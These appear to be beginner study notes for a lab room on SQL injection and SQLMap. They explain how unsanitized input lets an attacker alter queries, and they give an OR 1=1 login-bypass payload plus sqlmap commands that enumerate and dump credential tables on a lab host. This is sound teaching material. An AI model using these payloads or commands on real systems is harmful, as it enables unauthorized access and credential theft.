# SQLMap Basics

## Task 1 - Introduction to SQL Injection
**SQL Injection (SQLi)** is a very common and dangerous **vulnerability**. To understand it, we must first understand how websites use **databases**.

### What is a Database?
A **database** is a collection of data stored in a structured way. Websites use them to store:
* **User Credentials** (usernames and passwords).
* **Product Information** (like books in an online shop).
* **Personal Settings**.

### How Websites Talk to Databases
When you log in, the website asks the **database** if your password is correct. This "talk" happens using **SQL (Structured Query Language)**. The databases are managed by systems like **MySQL**, **PostgreSQL**, or **Microsoft SQL Server**.



---

## Task 2 - SQL Injection Vulnerability
A **SQL Injection** happens when a website does not "clean" or **sanitize** the input from a user. This allows an attacker to manipulate the **SQL query** to do things the developer didn't intend.

### Login Example:
If you enter **Username: John** and **Password: Un@detectable444**, the website runs:
```
SELECT * FROM users WHERE username = 'John' AND password = 'Un@detectable444';
```
### The Injection Attack:
If the attacker doesn't know the password, they might enter:
**Username: John**
**Password: abc' OR 1=1;-- -**

The query becomes:
```
SELECT * FROM users WHERE username = 'John' AND password = 'abc' OR 1=1;-- -';
```
* **' OR 1=1**: Since **1=1** is **always true**, the database ignores the wrong password and logs the attacker in anyway.
* **-- -**: This is a **comment**. It tells the database to ignore the rest of the original query so it doesn't crash.



---

## Task 3 - Automated SQL Injection Tool (SQLMap)
Manually finding these holes is hard. **SQLMap** is an **automated tool** that finds and exploits **SQL Injection** for you.

### Basic SQLMap Flags:
| Flag | Description |
| :--- | :--- |
| **-u** | Defines the **Target URL**. |
| **--wizard** | A beginner-friendly guide that asks you questions. |
| **--dbs** | Lists all available **databases**. |
| **-D** | Selects a specific **database**. |
| **--tables** | Lists all **tables** in a database. |
| **-T** | Selects a specific **table**. |
| **--dump** | Extracts all the data (records) from a table. |
| **-r** | Used for **POST-based** testing using a saved request file. |
| **--cookie** | Includes your **session cookie** for pages that require a login. |

---

## Practical Example using SQLMap

### 1. Scanning the URL
First, we check if the URL is vulnerable:
```
sqlmap -u http://sqlmaptesting.thm/search/cat=1
```
### 2. Finding Database Names
If it is vulnerable, we find the names of the databases:
```
sqlmap -u http://sqlmaptesting.thm/search/cat=1 --dbs
```
*Result: Found databases "users" and "members".*

### 3. Finding Table Names
Now we look inside the **users** database for tables:
```
sqlmap -u http://sqlmaptesting.thm/search/cat=1 -D users --tables
```
*Result: Found table "thomas".*

### 4. Stealing the Data (The Dump)
Finally, we grab the usernames and passwords from the **thomas** table:
```
sqlmap -u http://sqlmaptesting.thm/search/cat=1 -D users -T thomas --dump
```


---

## Task 4 - Conclusion
In this module we talked about:
* **SQL Injection** happens when user input is not **sanitized**.
* **Boolean-based**, **Error-based**, and **Union-based** are common injection types.
* **SQLMap** is the go-to tool for automating the discovery of these flaws.
